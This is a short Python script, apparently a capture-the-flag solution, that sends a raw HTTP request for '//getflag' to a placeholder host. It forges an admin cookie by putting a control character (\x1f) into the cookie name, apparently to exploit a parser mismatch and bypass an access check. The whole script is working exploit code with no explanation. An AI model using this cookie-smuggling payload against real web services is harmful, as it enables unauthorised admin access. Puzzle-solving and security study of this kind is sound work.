import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('[ip]', [port]))
s.send((f'''
GET //getflag HTTP/1.1
Cookie: user\x1f=admin
Connection: close
''' + '\n').lstrip().replace('\n', '\r\n').encode())
print(s.recv(65536).decode())
s.close()